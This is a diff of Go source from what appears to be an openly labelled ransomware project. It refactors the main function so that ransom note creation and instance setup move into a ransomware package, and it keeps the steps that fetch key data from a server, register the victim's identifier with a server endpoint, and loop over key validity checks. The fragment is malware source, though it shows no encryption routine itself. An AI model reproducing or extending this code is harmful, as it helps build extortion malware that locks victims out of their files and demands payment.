@@ -19,6 +19,7 @@ import (
 	"strings"
 	"time"
 
+	"github.com/nireo/gocry/ransomware"
 	"github.com/nireo/gocry/utils"
 	"github.com/nireo/gocry/victim"
 	uuid "github.com/satori/go.uuid"
@@ -203,14 +204,10 @@ func newRansomware() *Ransomware {
 }
 
 func main() {
-	ransomware := newRansomware()
-
-	// Create the message file
-	file, err := os.Create(ransomware.rootDir + "/ransom.txt")
+	rw, err := ransomware.NewRansomware(rootToEncrypt)
 	if err != nil {
-		log.Fatal(err)
+		log.Fatalf("error creating a ransomware instance: %s", err)
 	}
-	defer file.Close()
 
 	// Get block data from the server, this way the ransomware can run independently
 	// without needing the public key with the file.
@@ -257,9 +254,7 @@ func main() {
 	victimIndentifier.IP = "127.0.0.1"
 	victimIndentifier.SendToServer("http://localhost:8080/register")
 
-	if _, err := file.WriteString(message); err != nil {
-		log.Fatal(err)
-	}
+	rw.CreateRansomInfoFile(message)
 
 	// Start an infnite loop which checks key validity. We start in a goroutine, since
 	// we want the user to be able to interact with the ransomware.
